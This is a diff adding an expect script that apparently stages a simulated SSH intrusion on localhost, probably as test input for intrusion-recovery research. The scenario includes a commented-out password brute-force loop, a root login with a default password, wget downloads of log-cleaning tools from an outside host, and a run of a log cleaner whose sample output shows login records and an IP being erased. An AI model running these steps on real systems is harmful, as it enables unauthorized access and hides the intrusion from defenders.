@@ -1,0 +1,84 @@
+#!/usr/bin/expect
+
+# run ./setup-ssh.sh first
+
+set timeout -1
+
+#
+# brute force ssh
+#
+# #attacks = i
+# 
+# for {set i 0} {$i < 10} {incr i 1} {
+#     spawn ssh root@localhost -p 2022 -o "PreferredAuthentications password" -o "StrictHostKeyChecking no" -o "UserKnownHostsFile /dev/null"
+#     expect "password:"
+#     send "test1-{$i}\n"
+#     expect "password:"
+#     send "test2-{$i}\n"
+#     expect "password:"
+#     send "test3-{$i}\n"
+#     sleep 3
+# }
+
+spawn ssh root@localhost -p 2022 -o "PreferredAuthentications password" -o "StrictHostKeyChecking no" -o "UserKnownHostsFile /dev/null"
+expect "password:"
+send "root\n"
+
+expect ":~# "
+send "wget pdos.csail.mit.edu/~taesoo/public/undosys/lc\n"
+
+expect ":~# "
+send "wget pdos.csail.mit.edu/~taesoo/public/undosys/logclean\n"
+
+expect ":~# "
+send "wget pdos.csail.mit.edu/~taesoo/public/undosys/wtmpclean\n"
+
+expect ":~# "
+send "chmod +x lc logclean wtmpclean\n"
+
+# 
+# delete every logs/lastlog related to root
+#  or if there are ip & hostname
+#  
+expect ":~# "
+send "./lc\n"
+
+# 
+# send "reboot"
+# 
+expect ":~# "
+send "logout\n"
+
+sleep 2
+
+spawn ssh alice@localhost -p 2022 -o "PreferredAuthentications password" -o "StrictHostKeyChecking no" -o "UserKnownHostsFile /dev/null"
+expect "password:"
+send "alice\n"
+
+expect "\\$"
+send "wget http://www.opensource.apple.com/source/autoconf/autoconf-8/autoconf/autoconf.texi?txt\n"
+
+expect "\\$"
+send "mv autoconf.texi\?txt autoconf.texi\n"
+
+expect "\\$"
+send "texi2pdf -b autoconf.texi\n"
+
+expect "\\$"
+send "exit\n"
+
+wait
+
+#
+# root@taesoo-lab:~# ./lc -u root -a 18.26.4.156 -b mit.edu
+#
+# ******************************
+# * MIG Logcleaner v2.0 by no1 *
+# ******************************
+#
+# [0x1] 3 users "root" detected in /var/log/wtmp
+# [0x2] Removed "root" entry #1 from /var/log/wtmp
+# [0x3] Removed "root" corescponding entry from /var/run/utmp
+# [0x4] Changing "root" coresponding entry in /var/log/lastlog
+# [0x5] Removed "18.26.4.156" and "mit.edu" strings out of /var/log/ direcotry
+#
